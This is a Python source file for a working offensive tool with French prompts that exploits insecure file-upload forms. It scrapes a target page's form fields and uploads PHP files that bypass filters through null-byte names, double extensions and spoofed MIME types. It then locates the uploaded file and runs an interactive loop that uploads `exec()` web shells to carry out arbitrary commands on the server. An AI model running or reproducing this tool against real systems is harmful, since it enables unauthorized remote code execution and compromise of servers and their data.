import requests
import time
import base64
import argparse
import re
import readline
from urllib.parse import urlparse
import os
import binascii

# ============== PAYLOAD ============== #
main_payload = r"""
__/\\\\____________/\\\\_______________________________________________________________        
 _\/\\\\\\________/\\\\\\_______________________________________________________________       
  _\/\\\//\\\____/\\\//\\\_____________________________________/\\\______________________      
   _\/\\\\///\\\/\\\/_\/\\\___/\\\\\\\\\______/\\/\\\\\\_____/\\\\\\\\\\\___/\\\\\\\\\____     
    _\/\\\__\///\\\/___\/\\\__\////////\\\____\/\\\////\\\___\////\\\////___\////////\\\___    
     _\/\\\____\///_____\/\\\____/\\\\\\\\\\___\/\\\__\//\\\_____\/\\\_________/\\\\\\\\\\__   
      _\/\\\_____________\/\\\___/\\\/////\\\___\/\\\___\/\\\_____\/\\\_/\\____/\\\/////\\\__  
       _\/\\\_____________\/\\\__\//\\\\\\\\/\\__\/\\\___\/\\\_____\//\\\\\____\//\\\\\\\\/\\_ 
        _\///______________\///____\////////\//___\///____\///_______\/////______\////////\//__"""

exit_payload = r"""
_____/\\\\\\\\\\\\_____________________________________/\\\_____________/\\\_____________________________________        
 ___/\\\//////////_____________________________________\/\\\____________\/\\\_____________________________________       
  __/\\\________________________________________________\/\\\____________\/\\\___________/\\\__/\\\________________      
   _\/\\\____/\\\\\\\_____/\\\\\________/\\\\\___________\/\\\____________\/\\\__________\//\\\/\\\______/\\\\\\\\__     
    _\/\\\___\/////\\\___/\\\///\\\____/\\\///\\\____/\\\\\\\\\____________\/\\\\\\\\\_____\//\\\\\_____/\\\/////\\\_    
     _\/\\\_______\/\\\__/\\\__\//\\\__/\\\__\//\\\__/\\\////\\\____________\/\\\////\\\_____\//\\\_____/\\\\\\\\\\\__   
      _\/\\\_______\/\\\_\//\\\__/\\\__\//\\\__/\\\__\/\\\__\/\\\____________\/\\\__\/\\\__/\\_/\\\_____\//\\///////___  
       _\//\\\\\\\\\\\\/___\///\\\\\/____\///\\\\\/___\//\\\\\\\/\\___________\/\\\\\\\\\__\//\\\\/_______\//\\\\\\\\\\_ 
        __\////////////_______\/////________\/////______\///////\//____________\/////////____\////__________\//////////__"""

#====================ARGUMENT====================
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', dest='url', required=True, help='Url to exploit')
parser.add_argument('-c', '--cookie', dest='cookie', default=None, help='Cookie (c1=v1;c2=v2)')
parser.add_argument('-a', '--auto', dest='auto', action='store_true', default=None, help='Auto test every payload')
parser.add_argument('-H', '--header', dest='header', default=None, help='Headers (h1:v1;h2:v2)')
parser.add_argument('-d', '--details', dest='details', action='store_true', default=None, help='Show details of request / file send')
parser.add_argument('-b', '--body', dest='body', default=None, help='Extra body (unused)')
parser.add_argument('-i', '--dirb', dest='dirb', default=None, help='Wordlist to test url folder')
#parser.add_argument('-p', '--perso', dest='perso', action='store_true', default=None, help='Personnalize your file to upload')
args = parser.parse_args()
#==========================FUNCTION=========================#
def get_base_dir(url):
    p = urlparse(url)
    path = p.path
    if not path.endswith('/'):
        path = path.rsplit('/', 1)[0] + '/'
    return f"{p.scheme}://{p.netloc}{path}"
#==============================FUNCTION==============================
def filename_variants(name):
    if '%00' in name:
        return [name, name.split('%00', 1)[0]]
    return [name]
#==============================FUNCTION==============================
def find_file_urls(target_url, filename, returned_path=None, wordlist=None):
    urls = set()
    base = get_base_dir(target_url)

    if returned_path:
        clean = returned_path.lstrip('./')
        for fn in filename_variants(filename):
            urls.add(base + clean.replace(filename, fn))

    for fn in filename_variants(filename):
        urls.add(base + fn)

    common_dirs = ['upload', 'uploads', 'files', 'images', 'file', 'image', 'video', 'videos']
    for d in common_dirs:
        for fn in filename_variants(filename):
            urls.add(f"{base}{d}/{fn}")

    if args.dirb:
        with open(args.dirb, 'r', errors='ignore') as f:
            for d in f:
                d = d.strip().strip('/')
                for fn in filename_variants(filename):
                    urls.add(f"{base}{d}/{fn}")
    return list(urls)
#==============================FUNCTION==============================
def extract_vars(html):
    forms = re.findall(r"<form[\s\S]*?</form>", html, flags=re.IGNORECASE)
    names = set()
    for form in forms:
        names.update(re.findall(r'name=["\']([^"\']+)["\']', form, flags=re.IGNORECASE))
        names.update(re.findall(r'name=([^"\'>\s]+)', form, flags=re.IGNORECASE))
    return list(names)
#==============================FUNCTION==============================
def upload_file(url, field_name, payload, cookies=None, headers=None):

    global quiet
    content = payload["content"]
    if isinstance(content, str):
        content = content.encode()

    #if args.perso:
    #    print("Example to personnalize your file :\nFile name : image.php\nContent file : <?php echo 'test'?>\nMIME file : image/gif\n")
    #    name = str(input("File name :"))
    #    content = str(input("Content file :"))
    #    mime = str(input("MIME file :"))
    #    files = {field_name: (name, content, mime)}
    #else:
    files = {field_name: (payload["file_name"], content, payload["mime"])}
    r = session.post(url, files=files, data={"submit": "OK"}, cookies=cookies, headers=headers)
    if args.details and not quiet:
        print(f"#===================================================CONTENT PAGE===================================================\n{r.text}")
    return r
#==============================FUNCTION==============================
def analyze_response(html):
    result = {"success": False, "error": None, "path": None}
    err = re.search(r"(wrong|error|invalid|denied|fail)[^<]*", html, re.I)
    m = re.search(rf"(/[^\"'<>\s]*{re.escape(hash)}[^\"'<>\s]*)",html,re.I)
    paths = re.findall(r"""href=['"]([^'"]*{0}[^'"]*)['"]""".format(re.escape(hash)),html,re.I)

    if err:
        result["error"] = err.group(0).strip()
        return result
    if m:
        result["path"] = m.group(1)
        result["success"] = True
        return result
    if not paths:
        return result
    if len(paths) > 1:
        print("[+] Fichier différent toruvés :\n")
        for i, p in enumerate(paths, 1):
            print(f"[{i}] {p}")
        choice = int(input("Choix du fichier upload : "))
        result["path"] = paths[choice - 1]
    else:
        result["path"] = paths[0]
    result["success"] = True
    return result
#==============================FUNCTION==============================
def upload_and_analyze(url, field_name, payload, cookies=None, headers=None):

    global quiet
    r = upload_file(url, field_name, payload, cookies, headers)
    u = analyze_response(r.text)
    if args.details and not quiet:
        print("#============================#=============================================================#")
        print(f"| Analyse response from html | {u}")
    return u
#==============================FUNCTION==============================
def find_uploaded_file(target_url, payload, returned_path,cookies=None, headers=None, wordlist=None):

    global quiet
    urls = find_file_urls(target_url, payload['file_name'], returned_path, wordlist)
    if args.details and not quiet:
        for url in urls:
            print("#============================#================================================================================#")
            print(f'| Url test for retreive file | {url}')
        print("#============================#================================================================================#")

    for u in urls:
        r = session.get(u, cookies=cookies, headers=headers)
        if r.status_code == 200:
            print(f"[+] HIT -> {u}")
            return r.text, u

    url_hit = search_from_hash(get_base_dir(target_url))
    if url_hit:
        r = session.get(url_hit, cookies=cookies, headers=headers)
        if r.status_code == 200:
            print(f"[+] HIT (By other url) -> {url_hit}")
            quiet = True
            return r.text, url_hit
    return None, None
#==============================FUNCTION==============================
def search_from_hash(base):

    global quiet
    r = session.get(base, cookies=cookies, headers=headers)
    links = re.findall(r"""href=['"]([^'"]+)['"]""", r.text, re.I)

    for l in links:
        link = base + l.strip("'\"")
        page = session.get(link, cookies=cookies, headers=headers).text
        if args.details and not quiet:
            print("#============================#================================================================================#")
            print(f"| Url test for retreive file | {link}")
            print("#============================#================================================================================#")
            print(page)
        if hash in page:
            m = re.search(rf"(/[^\"'<>\s]*{re.escape(hash)}[^\"'<>\s]*)", page)
            if m:
                return base.rstrip("/") + m.group(1)
    return None
#==========================COOKIES + HEADERS==========================#
cookies = None
headers = None

if args.cookie:
    cookies = dict(c.split("=", 1) for c in args.cookie.split(";"))

if args.header:
    headers = dict(h.split(":", 1) for h in args.header.split(";"))
#==========================VARIABLES==========================#
hash = binascii.hexlify(os.urandom(16)).decode()
# succes false cause exploit is false for the beginning
succes = False
# quiet = if exploir true, hide details
quiet = False
session = requests.Session()
session.cookies.update(cookies or {})
session.headers.update(headers or {})
#==========================PAYLOADS==========================#
payloads = {
    0: {"file_name": f"{hash}.txt", "mime": "text/plain", "content": "Ray manta upload"},
    1: {"file_name": f"{hash}.php%00.png", "mime": "image/jpeg", "content": "<?php echo 'Ray manta upload'; ?>"},
    2: {"file_name": f"{hash}.php", "mime": "image/gif", "content": "<?php echo 'Ray manta upload'; ?>"},
    3: {"file_name": f"{hash}.gif", "mime": "application/x-php", "content": "<?php echo 'Ray manta upload'; ?>"},
    4: {"file_name": f"{hash}.php.jpg", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"}
}
# \xff\xd8\xff\xe0
#====================================OPTIONS====================================#
print(f"{main_payload}\n")

#if args.auto and args.perso:
#    print("[!] You can't send a personnalized file and send all payloads")
#    print(exit_payload)
#    exit()
if args.url:
    print(f"[+] Target : {args.url}")

    html = session.get(args.url, cookies=cookies, headers=headers).text
    vars = extract_vars(html)

    if len(vars) == 0:
        print("[!] Aucun champ trouvé")
        print(exit_payload)
        exit()
    elif len(vars) == 1:
        field_name = vars[0]
        print(f"[+] Champ trouvé : {field_name}")
    else:
        print("[+] Champs disponibles :")
        for idx, var in enumerate(vars):
            print(f"[{idx}] {var}")
        field_name = vars[int(input("\nChoisir un numéro de payload : "))]

    if args.auto:
        test_payload = payloads.keys()
    else:
        print("\n[+] Payloads disponibles :")
        for idx in payloads:
            print(f"[{idx}] {payloads[idx]['file_name']}")
        test_payload = [int(input("\n[+] Choisis le numéro du payload : "))]
    print("\n[+] Lancement des tests...\n")

    for idx in test_payload:
        payload = payloads[idx]
        print(f"[+] Upload '{payload['file_name']}' sur la variable '{field_name}'")
        res = upload_and_analyze(args.url, field_name, payload, cookies, headers)
        if args.details:
            print(f"| Information file uploaded  | {payload}")
            print("#============================#=============================================================#")

            

        if not res["success"]:
            print(f"[-] FAIL -> {res['error']}\n")
            continue

        content, url = find_uploaded_file(args.url, payload, res["path"], cookies, headers, args.dirb)

        if content == "Ray manta upload":
            print("[+] EXPLOIT succes")

            while True:
                cmd = input("exit | quit | back to stop exploit\nExploit command : ")
                if cmd.lower() in ["exit", "quit", "back"]:
                    print(exit_payload)
                    exit()
                payload["content"] = f"<?php exec('{cmd}', $r); var_dump($r);?>"
                res = upload_and_analyze(args.url, field_name, payload, cookies, headers)
                if not res["success"]:
                    continue

                content, _ = find_uploaded_file(args.url, payload, res["path"], cookies, headers, args.dirb)
                if content:
                    print(content)
        else:
            print(res)
            print()
            print(f"\n[!] File not found or file error, content : \n{content}\n")

    print("[+] Terminé")
    print(exit_payload)

else:
    print("[!] Tu dois spécifier une url (-u | --url)")